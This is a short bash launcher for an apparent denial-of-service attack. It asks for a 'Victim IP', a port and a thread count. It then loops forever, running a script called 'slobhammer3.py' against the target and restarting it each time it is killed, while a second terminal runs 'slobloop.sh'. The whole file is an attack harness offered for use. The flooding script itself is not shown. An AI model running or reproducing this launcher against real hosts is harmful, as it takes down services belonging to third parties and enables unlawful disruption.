echo "Enter Victim IP: "
read IP
echo "Enter Victim Port: "
read port
echo "Enter Amount of Threads: "
read threads
gnome-terminal --tab -e "./slobloop.sh"
while [ true ]; do
     ./slobhammer3.py -T -t $IP -p $port -r $threads
     echo ""
     echo ""
     echo ""
     echo "KILLED"
     echo ""
     echo ""
     echo "Restarting..."
     echo ""
     echo ""
     sleep 1
done
